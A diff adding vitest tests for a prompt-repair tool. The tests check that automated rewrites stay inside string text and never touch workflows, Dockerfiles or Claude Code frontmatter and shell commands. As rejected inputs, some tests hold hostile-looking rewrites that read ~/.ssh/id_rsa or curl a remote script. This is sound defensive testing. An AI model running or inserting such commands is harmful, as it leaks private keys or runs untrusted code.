@@ -3,7 +3,9 @@ import { mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
 import { tmpdir } from 'node:os';
 import { join } from 'node:path';
 import { describe, expect, it } from 'vitest';
-import { applyEdit, patchFiles, REPAIR_FILE_LIMIT, repairNeverRewrites, repairPatchProblem, unifiedDiff, type RepairCandidate } from '../src/repair.js';
+import { applyEdit, REPAIR_FILE_LIMIT, unifiedDiff, type RepairCandidate } from '../src/repair.js';
+import { modelSwitch, patchFiles, repairNeverRewrites, repairNeverRewritesAt, repairPatchProblem, rewritableAnchors, rewriteHere } from '../src/repair-patch.js';
+import { AGENTS_YAML, COMMAND, CONFIG_REWRITES, DOT, RUNNERS, SKILL, SUBAGENT, TASKS_YAML } from './runner-fixtures.js';
 import { times, timesOf } from './timing.js';
 
 /**
@@ -165,6 +167,261 @@ describe('repairPatchProblem', () => {
       expect(repairPatchProblem(report(c, AGENT, unifiedDiff(file, AGENT, AGENT.replace(BEFORE, AFTER)))), file).toMatch(/is not a plain path inside the repository$/);
     }
     expect(repairPatchProblem({ ...report(), accepted: 9 })).toBe('no accepted candidate comes with it');
+  });
+
+  it('refuses a candidate that rewrites a file that runs, or one a repair rewrites no text in; a value that runs is for the working tree to tell', () => {
+    for (const r of RUNNERS) {
+      const c = candidate({ file: r.file, offset: r.content.indexOf(r.before), before: r.before, after: r.after });
+      expect(repairPatchProblem(report(c, r.content)), r.file).toBe(r.runs === 'file' ? `its accepted candidate rewrites ${r.file}, ${r.what}: a repair never rewrites a file that runs` : null);
+    }
+    // Read as Windows and macOS read a name too: in any case, without the dots and spaces dropped from its end.
+    for (const file of ['.GitHub/Workflows/CI.yml', '.github/workflows./ci.yml', 'DOCKERFILE', 'docker/Dockerfile.dev', 'GNUmakefile', 'tools/build.mk', 'scripts/Deploy.SH']) {
+      const content = 'echo build\n';
+      const c = candidate({ file, offset: 0, before: 'echo build', after: 'echo build again' });
+      expect(repairPatchProblem(report(c, content)), file).toMatch(/: a repair never rewrites a file that runs$/);
+    }
+    const tail = 'a repair rewrites text only in a string of JavaScript, TypeScript or Python source, a string value of YAML, JSON or TOML, or a Markdown, plain text, prompt or Jinja file';
+    const content = `prompt = "${BEFORE}"\n`;
+    for (const [file, kind] of [['main.go', 'a .go file'], ['lib/agent.rb', 'a .rb file'], ['docs/page.mdx', 'a .mdx file'], ['notebook.ipynb', 'a .ipynb file'], ['NOTICE', 'a file with no extension']]) {
+      const c = candidate({ file, offset: content.indexOf(BEFORE), before: BEFORE, after: AFTER });
+      expect(repairPatchProblem(report(c, content)), file).toBe(`its accepted candidate rewrites ${file}, ${kind}: ${tail}`);
+    }
+  });
+});
+
+describe('repairNeverRewritesAt', () => {
+  const at = (path: string, content: string, text: string) => repairNeverRewritesAt({ path, content }, content.indexOf(text), text.length);
+
+  it('takes text inside one string of JavaScript, TypeScript or Python, and any text of a Markdown, plain text, prompt or Jinja file', () => {
+    expect(at('agent.mjs', AGENT, BEFORE)).toBeNull();
+    expect(at('agent.mjs', AGENT, 'Hand the case to a manager.')).toBeNull();
+    expect(at('src/prompt.tsx', 'export const p = (limit: number) => `Refunds above ${limit} need a manager.`;\n', 'Refunds above ${limit} need a manager.')).toBeNull();
+    expect(at('tools.py', 'def refund():\n    """Refund an order.\n\n    Never twice."""\n', 'Refund an order.\n\n    Never twice.')).toBeNull();
+    expect(at('agent.py', 'SYSTEM = f"Refunds above {limit} need a manager."\n', 'Refunds above {limit} need a manager.')).toBeNull();
+    expect(at('agent.py', "MODEL = os.environ.get('MODEL', 'small-model')\n", 'small-model')).toBeNull();
+    for (const path of ['prompts/policy.md', 'system.txt', 'docs/agent.rst', 'refund.prompt', 'templates/system.j2', 'templates/system.jinja2']) {
+      expect(at(path, 'Refunds above {{ limit }} need a manager.\n', 'above {{ limit }} need'), path).toBeNull();
+    }
+  });
+
+  it("takes text inside one string value of YAML, JSON or TOML: CrewAI's prompts, a config's model, a value beside one that runs", () => {
+    for (const r of CONFIG_REWRITES) expect(at(r.file, r.content, r.before), `${r.file}: ${r.before}`).toBeNull();
+    // A line of a block over several, and a TOML string over several lines.
+    expect(at('config/tasks.yaml', TASKS_YAML, 'Conduct a thorough research')).toBeNull();
+    expect(at('agent.toml', '[agent]\nprompt = """\nYou are a support agent.\nFollow the refund policy."""\n', 'support agent.\nFollow the refund')).toBeNull();
+  });
+
+  it('refuses text outside one string value, over the lines of a YAML value, inside a placeholder, or rewritten into YAML syntax', () => {
+    const outside = 'is outside any string value: in YAML, JSON or TOML, a repair rewrites only text inside one string value';
+    expect(at('config/agents.yaml', AGENTS_YAML, 'researcher:')).toBe(outside);
+    expect(at('config/agent.json', '{\n  "model": "small-model",\n  "temperature": 0\n}\n', '"temperature": 0')).toBe(outside);
+    expect(at('config/agents.yaml', 'tools: [search, scrape_website]\n', 'search')).toBe(outside);
+    expect(at('config/agents.yaml', 'verbose: true\n', 'true')).toBe(outside);
+    expect(at('config/agents.yaml', AGENTS_YAML, 'latest developments in {topic}.\n    Known for')).toBe("runs over lines of a YAML value: a rewrite there stays on one line, since YAML reads a line's indentation");
+    expect(at('config/agent.json', '{ "a": "one", "b": "two" }\n', 'one", "b": "two')).toBe('runs past the end of the string value it starts in: a repair rewrites text inside one string value');
+    expect(at('config/agents.yaml', AGENTS_YAML, 'on {topic')).toBe('starts or ends inside {topic}: a rewrite keeps each placeholder whole');
+    // A plain value's rewrite stays text: no YAML syntax at its start, no key, no comment, no value that is no text.
+    const role = (replace: string) => repairNeverRewritesAt({ path: 'config/agents.yaml', content: AGENTS_YAML }, AGENTS_YAML.indexOf('Senior Data'), 'Senior Data Researcher on {topic}'.length, replace);
+    expect(role('Senior Data Researcher on {topic}, who checks every source')).toBeNull();
+    expect(role('*Senior Data Researcher on {topic}')).toBe('is a plain YAML value its rewrite would start it with "*", which YAML reads as its own syntax there');
+    expect(role('Senior Data Researcher on {topic}: every source')).toBe("is a plain YAML value its rewrite would put a ': ' in it, which YAML reads as a key");
+    expect(role('Senior Data Researcher on {topic} #rated')).toBe("is a plain YAML value its rewrite would put a ' #' in it, which YAML reads as a comment");
+    // A block's line and a quoted value take what is text there.
+    const backstory = 'Known for your ability to find the most relevant information and present it clearly.';
+    expect(repairNeverRewritesAt({ path: 'config/agents.yaml', content: AGENTS_YAML }, AGENTS_YAML.indexOf(backstory), backstory.length, `${backstory} Note: cite sources #always`)).toBeNull();
+  });
+
+  it('refuses code, a comment, text past the end of its string, and text that starts or ends inside a placeholder', () => {
+    const outside = 'is outside any string: in code, a repair rewrites only text inside a string';
+    expect(at('agent.mjs', AGENT, 'const tools = [')).toBe(outside);
+    expect(at('agent.mjs', `// ${BEFORE}\nconst a = 1;\n`, BEFORE)).toBe(outside);
+    expect(at('agent.py', `# ${BEFORE}\nrun(cmd, shell=False)\n`, 'shell=False')).toBe(outside);
+    expect(at('agent.mjs', 'const re = /Follow the refund policy/;\n', 'Follow the refund policy')).toBe(outside);
+    const past = 'runs past the end of the string it starts in: a repair rewrites text inside one string';
+    expect(at('agent.mjs', AGENT, "refund policy.';")).toBe(past);
+    expect(at('agent.mjs', "const a = 'one', b = 'two';\n", "one', b = 'two")).toBe(past);
+    const inside = (p: string) => `starts or ends inside ${p}: a rewrite keeps each placeholder whole`;
+    expect(at('agent.py', 'SYSTEM = f"Refunds above {limit} need a manager."\n', 'limit} need a manager.')).toBe(inside('{limit}'));
+    expect(at('agent.mjs', 'const s = `Refunds above ${policy.limit} need a manager.`;\n', 'Refunds above ${policy')).toBe(inside('${policy.limit}'));
+    expect(at('prompts/policy.md', 'Refunds above {{ limit }} need a manager.\n', 'limit }} need a manager.')).toBe(inside('{{ limit }}'));
+  });
+
+  it('refuses every runner, a file that runs or a value that runs, with why', () => {
+    for (const r of RUNNERS) expect(at(r.file, r.content, r.before), r.file).toBe(`is in ${r.what}: a repair never rewrites what runs`);
+    // So is an anchored value in a compose file, which an alias can make a command.
+    const anchored = 'x-run: &run "python agent.py --serve"\nservices:\n  agent:\n    command: *run\n';
+    expect(at('docker-compose.yml', anchored, 'python agent.py --serve')).toBe(`is in ${RUNNERS.find((r) => r.file === 'docker-compose.yml')!.what}: a repair never rewrites what runs`);
+  });
+
+  it("refuses every other kind of file, whose text Shadowlap can't tell from code", () => {
+    for (const [path, kind] of [['main.go', 'a .go file'], ['lib/agent.rb', 'a .rb file'], ['docs/page.mdx', 'a .mdx file'], ['notebook.ipynb', 'a .ipynb file'], ['NOTICE', 'a file with no extension']]) {
+      expect(at(path, 'run: npm test\n', 'npm test'), path).toBe(`is in ${kind}: a repair rewrites text only in a string of JavaScript, TypeScript or Python source, a string value of YAML, JSON or TOML, or a Markdown, plain text, prompt or Jinja file`);
+    }
+  });
+});
+
+describe('rewriteHere', () => {
+  /** A pulled repair whose accepted candidate rewrites `before` in `file` to `after`, its patch made on `content`, checked against the file as it is `here`. */
+  const pulled = (file: string, content: string, before: string, after: string, here = content) => rewriteHere(report(candidate({ file, offset: content.indexOf(before), before, after }), content), here);
+  const why = (file: string, reason: string) => ({ problem: `here, the text its accepted candidate rewrites in ${file} ${reason}` });
+
+  it("takes a repair's rewrite where its patch puts it: in place, lower down, with CRLF here, a model's name, a Markdown prompt", () => {
+    expect(pulled('agent.mjs', AGENT, BEFORE, AFTER)).toEqual({ problem: null });
+    // Lines added above it since: the patch goes in lower down, and is checked there.
+    expect(pulled('agent.mjs', AGENT, BEFORE, AFTER, `// The agent.\n\n${AGENT}`)).toEqual({ problem: null });
+    // A teammate's patch with LF, for a checkout whose file has CRLF.
+    expect(pulled('agent.mjs', AGENT, BEFORE, AFTER, AGENT.replace(/\n/g, '\r\n'))).toEqual({ problem: null });
+    // A switch of model: the name alone, quoted, and in a comment too.
+    expect(pulled('agent.mjs', "const model = process.env.MODEL ?? 'small-model'; // small-model is the cheap one\n", 'small-model', 'big-model')).toEqual({ problem: null });
+    expect(pulled('prompts/policy.md', '# Policy\n\nRefunds above {{ limit }} need a manager.\n', 'need a manager.', "need a manager: don't issue them.")).toEqual({ problem: null });
+    // Text added that repeats what is beside it, where the file and the patched file first differ further on.
+    expect(pulled('agent.mjs', "const s = 'This is very important.';\n", 'This is very important.', 'This is very very important.')).toEqual({ problem: null });
+    // The text a whole long prompt holds, its last line rewritten: the patch holds only the lines around it.
+    const whole = longPrompt();
+    const c = whole.candidates.find((x) => x.id === whole.accepted)!;
+    const file = `const system = \`${c.before}\`;\nexport default system;\n`;
+    expect(rewriteHere(whole, file)).toEqual({ problem: null });
+    // Nothing to check where the patch's lines aren't: it is in already, or the file changed since.
+    expect(pulled('agent.mjs', AGENT, BEFORE, AFTER, AGENT.replace(BEFORE, AFTER))).toBeNull();
+  });
+
+  it('refuses a rewrite of code, of text past the end of its string, or inside a placeholder, in the file as it is here', () => {
+    expect(pulled('agent.mjs', AGENT, 'const tools = [', 'const tools = [process.exit(),')).toEqual(why('agent.mjs', 'is outside any string: in code, a repair rewrites only text inside a string'));
+    expect(pulled('agent.mjs', AGENT, "refund policy.';\nconst tools", "refund policy.';\nconst tools = process.exitCode")).toEqual(why('agent.mjs', 'runs past the end of the string it starts in: a repair rewrites text inside one string'));
+    expect(pulled('agent.py', 'SYSTEM = f"Refunds above {limit} need a manager."\n', 'limit} need a manager.', 'os.getcwd()} need a manager.')).toEqual(why('agent.py', 'starts or ends inside {limit}: a rewrite keeps each placeholder whole'));
+    // In a string where it was made, and code here: a triple quote above the patch's lines is a comment's.
+    const lines = ['a', 'b', 'c', 'd', 'run(shell=False)', 'e', 'f', 'g', 'h', '"""', ''];
+    const made = `PROMPT = """\n${lines.join('\n')}`;
+    const here = `PROMPT = 0  # """\n${lines.join('\n')}`;
+    expect(pulled('agent.py', made, 'shell=False', 'shell=True')).toEqual({ problem: null });
+    expect(pulled('agent.py', made, 'shell=False', 'shell=True', here)).toEqual(why('agent.py', 'is outside any string: in code, a repair rewrites only text inside a string'));
+  });
+
+  it('refuses a rewrite repair sets aside: a quote, a placeholder, a line break in one-line text, white space at either end', () => {
+    const aside = (reason: string) => ({ problem: `its accepted candidate's rewrite is one a repair sets aside: ${reason}` });
+    expect(pulled('agent.mjs', AGENT, BEFORE, `${BEFORE} Don't refund twice.`)).toEqual(aside("it adds a ' quote, 1 where the text it replaces has none, which could end the string it goes into in agent.mjs"));
+    expect(pulled('agent.mjs', AGENT, BEFORE, `${BEFORE} Today is \${new Date()}.`)).toEqual(aside('it brings in ${new Date()}, which agent.mjs could fill in when the agent builds its prompt, as code or as a value of the agent\'s: a rewrite keeps the placeholders of the text it replaces and adds none'));
+    expect(pulled('agent.mjs', AGENT, BEFORE, `${BEFORE}\nEscalate.`)).toEqual(aside('the replacement spans several lines, and the text it replaces is one'));
+    expect(pulled('agent.mjs', AGENT, BEFORE, ` ${AFTER}`)).toEqual({ problem: "its accepted candidate's rewrite starts or ends with white space, which a repair trims" });
+  });
+
+  it("refuses where the patch's lines are in the file more than once, or the candidate's text is not where they are", () => {
+    expect(pulled('agent.mjs', AGENT, BEFORE, AFTER, `${AGENT}${AGENT}`)).toEqual({ problem: 'the lines it changes are in agent.mjs more than once here, so where it goes is not one place' });
+    // A hunk of no line at all, which git puts at the top of the file: never one a repair writes.
+    const top = { ...report(), patch: ['diff --git a/agent.mjs b/agent.mjs', '--- a/agent.mjs', '+++ b/agent.mjs', '@@ -0,0 +1,1 @@', '+X', ''].join('\n') };
+    top.candidates = top.candidates.map((x) => (x.id === top.accepted ? { ...x, before: 'a\nb', after: 'a\nX\nb' } : x));
+    expect(rewriteHere(top, AGENT)).toEqual({ problem: "its hunk holds no line of agent.mjs, where a repair's holds the lines its rewrite changes" });
+    const whole = longPrompt();
+    const c = whole.candidates.find((x) => x.id === whole.accepted)!;
+    const file = `const system = \`${c.before.replace('You are a support agent.', 'You are a sales agent.')}\`;\nexport default system;\n`;
+    expect(rewriteHere(whole, file)).toEqual({ problem: "here, the text its accepted candidate rewrites is not where its patch changes agent.mjs" });
+  });
+});
+
+describe("a repair's text in config: CrewAI's prompts, a config's model, and what runs", () => {
+  /** CrewAI's prompts as an agent sends them: its role, goal and backstory, and its task, with {topic} filled in. */
+  const sent = [
+    { label: 'system prompt', text: "Senior Data Researcher on AI agents\nUncover cutting-edge developments in AI agents\nYou're a seasoned researcher with a knack for uncovering the latest developments in AI agents. Known for your ability to find the most relevant information and present it clearly." },
+    { label: 'tool research', text: 'Conduct a thorough research about AI agents. Make sure you find any interesting and relevant information.' },
+  ];
+
+  it("anchors in CrewAI's agents.yaml and tasks.yaml: a role, a goal and a backstory, plain, quoted and folded, and a task's description", () => {
+    const anchors = rewritableAnchors(sent, [{ path: 'config/agents.yaml', content: AGENTS_YAML }, { path: 'config/tasks.yaml', content: TASKS_YAML }]);
+    expect(anchors.map((a) => [a.id, a.file, a.text])).toEqual([
+      [1, 'config/agents.yaml', 'Senior Data Researcher on {topic}'],
+      [2, 'config/agents.yaml', 'Uncover cutting-edge developments in {topic}'],
+      [3, 'config/agents.yaml', "You're a seasoned researcher with a knack for uncovering the latest developments in {topic}."],
+      [4, 'config/agents.yaml', 'Known for your ability to find the most relevant information and present it clearly.'],
+      [5, 'config/tasks.yaml', 'Conduct a thorough research about {topic}.'],
+      [6, 'config/tasks.yaml', 'Make sure you find any interesting and relevant information.'],
+    ]);
+    // A prompt only a workflow holds, in a step it runs, is never anchored.
+    const workflow = { path: '.github/workflows/research.yml', content: 'on: push\njobs:\n  research:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo "Senior Data Researcher on AI agents"\n' };
+    expect(rewritableAnchors([{ label: 'system prompt', text: 'Senior Data Researcher on AI agents' }], [workflow])).toEqual([]);
+  });
+
+  it('switches a model named in a JSON or a TOML config where it is, and none named in what runs', () => {
+    const json = { path: 'config/agent.json', content: '{\n  "model": "small-model",\n  "temperature": 0\n}\n' };
+    const toml = { path: 'agent.toml', content: '[agent]\nmodel = "small-model"\n' };
+    expect(modelSwitch([json], 'small-model', 'big-model')).toEqual({ file: 'config/agent.json', offset: json.content.indexOf('small-model') });
+    expect(modelSwitch([toml], 'small-model', 'big-model')).toEqual({ file: 'agent.toml', offset: toml.content.indexOf('small-model') });
+    expect(modelSwitch([json, toml], 'small-model', 'big-model')).toEqual({ why: 'the model name small-model appears 2 times in the source as a string' });
+    const compose = { path: 'docker-compose.yml', content: 'services:\n  agent:\n    command: python agent.py --model "small-model"\n' };
+    expect(modelSwitch([compose], 'small-model', 'big-model')).toEqual({ why: 'the model name small-model is in docker-compose.yml, where a repair rewrites no text' });
+    expect(modelSwitch([json], 'small-model', "big'model")).toEqual({ why: "it adds a ' quote, 1 where the text it replaces has none, which could end the string it goes into in config/agent.json" });
+  });
+
+  it('takes a pulled patch to them here, and refuses one to a value that runs, as the file reads here', () => {
+    const pulled = (r: { file: string; content: string; before: string; after: string }) => rewriteHere(report(candidate({ file: r.file, offset: r.content.indexOf(r.before), before: r.before, after: r.after }), r.content), r.content);
+    for (const r of CONFIG_REWRITES) expect(pulled(r), `${r.file}: ${r.before}`).toEqual({ problem: null });
+    for (const r of RUNNERS.filter((x) => x.runs === 'value')) expect(pulled(r), r.file).toEqual({ problem: `here, the text its accepted candidate rewrites in ${r.file} is in ${r.what}: a repair never rewrites what runs` });
+    // A plain value its rewrite would turn into YAML syntax: an alias, which a loader resolves.
+    expect(pulled({ file: 'config/agents.yaml', content: AGENTS_YAML, before: 'Senior Data Researcher on {topic}', after: '*Senior Data Researcher on {topic}' })).toEqual({ problem: 'here, the text its accepted candidate rewrites in config/agents.yaml is a plain YAML value its rewrite would start it with "*", which YAML reads as its own syntax there' });
+  });
+});
+
+describe("a Claude Code subagent's, skill's or command's Markdown: its body, never its frontmatter", () => {
+  const at = (path: string, content: string, text: string, replace?: string) => repairNeverRewritesAt({ path, content }, content.indexOf(text), text.length, replace);
+  const frontmatter = "is in a Claude Code subagent's, skill's or command's frontmatter, whose tools, model and hooks say what it runs: a repair never rewrites what runs";
+
+  it("anchors in a subagent's body, the prompt the Claude Agent SDK sends, and not in its frontmatter", () => {
+    const sent = [
+      { label: 'system prompt', text: 'You are a refunds specialist. Follow the refund policy.\n\nEscalate every refund above the limit to a manager.' },
+      { label: 'tool Task', text: 'refunds: Handles refund requests for orders' },
+    ];
+    const anchors = rewritableAnchors(sent, [{ path: '.claude/agents/refunds.md', content: SUBAGENT }]);
+    // Its body whole; the description its frontmatter gives the Task tool is never one.
+    expect(anchors.map((a) => [a.id, a.file, a.text])).toEqual([[1, '.claude/agents/refunds.md', 'You are a refunds specialist. Follow the refund policy.\n\nEscalate every refund above the limit to a manager.']]);
+  });
+
+  it('takes text in the body of each, in a .claude folder anywhere in the repository', () => {
+    expect(at('.claude/agents/refunds.md', SUBAGENT, 'Follow the refund policy.')).toBeNull();
+    expect(at('.claude/agents/support/refunds.md', SUBAGENT, 'Escalate every refund')).toBeNull();
+    expect(at('.claude/skills/refund-policy/SKILL.md', SKILL, 'Refunds above the limit')).toBeNull();
+    expect(at('.claude/skills/refund-policy/reference.md', 'Refunds above the limit need a manager.\n', 'need a manager')).toBeNull();
+    expect(at('.claude/commands/refund.md', COMMAND, 'against the refund policy.')).toBeNull();
+    expect(at('services/support/.claude/agents/refunds.md', SUBAGENT, 'Follow the refund policy.')).toBeNull();
+    expect(at('.claude/agents/plain.md', 'You are a refunds specialist.\n', 'refunds specialist')).toBeNull();
+  });
+
+  it('refuses its frontmatter, all of it when it never closes, and every other file in .claude', () => {
+    for (const text of ['name: refunds', 'Handles refund requests for orders', 'Read, Grep', 'sonnet']) expect(at('.claude/agents/refunds.md', SUBAGENT, text), text).toBe(frontmatter);
+    expect(at('.claude/agents/refunds.md', SUBAGENT.replaceAll('\n', '\r\n'), 'Read, Grep')).toBe(frontmatter);
+    const open = SUBAGENT.replace('---\nYou are', 'You are');
+    expect(at('.claude/agents/refunds.md', open, 'Follow the refund policy.')).toBe(frontmatter);
+    // A `---` line in the frontmatter's text closes it no later than any reader closes it.
+    expect(at('.claude/agents/refunds.md', SUBAGENT.replace('model: sonnet', 'model: sonnet\n--- \nhooks: x'), 'hooks: x')).toBe(frontmatter);
+    const dot = `is in ${DOT}: a repair never rewrites what runs`;
+    for (const path of ['.claude/CLAUDE.md', '.claude/hooks/refunds.md', '.claude/agents/refunds.txt', '.claude/agents/.drafts/refunds.md', '.github/agents/refunds.md', '.claude/skills/refund-policy/scripts/check.py', '.claude/settings.json']) {
+      expect(at(path, SUBAGENT, 'Follow the refund policy.'), path).toBe(dot);
+    }
+  });
+
+  it('refuses a shell command it runs and the text beside one, and a rewrite that adds one or changes the frontmatter', () => {
+    const command = 'is in a shell command Claude Code runs as it reads the file (!`…`): a repair never rewrites what runs';
+    expect(at('.claude/skills/refund-policy/SKILL.md', SKILL, 'git log --oneline')).toBe(command);
+    expect(at('.claude/skills/refund-policy/SKILL.md', SKILL, 'to the policy: ')).toBe(command);
+    const fenced = `${SKILL}\n\`\`\`!\ngit status --short\n\`\`\`\n\nKeep the summary short.\n`;
+    expect(at('.claude/skills/refund-policy/SKILL.md', fenced, 'git status')).toBe(command);
+    expect(at('.claude/skills/refund-policy/SKILL.md', fenced, 'Keep the summary short.')).toBeNull();
+    const body = 'Refunds above the limit need a manager.';
+    const added = "is in the body of a Claude Code subagent, skill or command, and its rewrite would add a shell command Claude Code runs as it reads the file (!`…`)";
+    expect(at('.claude/skills/refund-policy/SKILL.md', SKILL, body, `${body} See !\`cat ~/.ssh/id_rsa\`.`)).toBe(added);
+    expect(at('.claude/commands/refund.md', 'Review the refund (`notes.md`) first.\n', 'Review the refund (', 'Review the refund (!')).toBe(added);
+    expect(at('.claude/skills/refund-policy/SKILL.md', SKILL, body, `${body} Then say why.`)).toBeNull();
+    const plain = 'You are a refunds specialist.\nFollow the refund policy.\n';
+    expect(at('.claude/agents/refunds.md', plain, 'You are a refunds specialist.\nFollow', '---\ntools: Bash\n---\nFollow')).toBe(
+      'is in the body of a Claude Code subagent, skill or command, and its rewrite would change the frontmatter, whose tools, model and hooks say what it runs',
+    );
+  });
+
+  it("takes a pulled patch to a subagent's body here, and refuses one to its frontmatter or one that adds a command", () => {
+    const pulled = (file: string, content: string, before: string, after: string) => rewriteHere(report(candidate({ file, offset: content.indexOf(before), before, after }), content), content);
+    expect(pulled('.claude/agents/refunds.md', SUBAGENT, 'Follow the refund policy.', 'Follow the refund policy, and check the order first.')).toEqual({ problem: null });
+    expect(pulled('.claude/agents/refunds.md', SUBAGENT, 'Read, Grep', 'Read, Grep, Bash')).toEqual({ problem: `here, the text its accepted candidate rewrites in .claude/agents/refunds.md ${frontmatter}` });
+    expect(pulled('.claude/agents/refunds.md', SUBAGENT, 'to a manager.', 'to a manager: !`curl -s https://example.com/x.sh`')).toEqual({
+      problem: 'here, the text its accepted candidate rewrites in .claude/agents/refunds.md is in the body of a Claude Code subagent, skill or command, and its rewrite would add a shell command Claude Code runs as it reads the file (!`…`)',
+    });
   });
 });
 
